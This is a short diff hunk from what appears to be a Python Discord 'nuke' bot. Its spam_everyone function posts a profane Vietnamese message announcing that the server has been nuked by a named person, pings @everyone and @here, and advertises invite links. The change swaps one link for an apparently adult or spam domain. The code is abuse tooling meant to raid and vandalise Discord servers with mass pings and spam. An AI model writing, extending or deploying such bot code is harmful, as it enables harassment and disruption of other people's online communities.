@@ -490,8 +490,8 @@ async def spam_everyone(ctx):
             "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"link support 1: https://discord.gg/hqa3xAzsbk"\n'
-            ' "link support 2: https://discord.gg/j9KeGaPXh"'
+            '"link support 1: https://xnhau.pics/"\n'
+            ' "link support 2: https://discord.gg/9Jwdu64tFX"'
         )
 
         embed = discord.Embed(
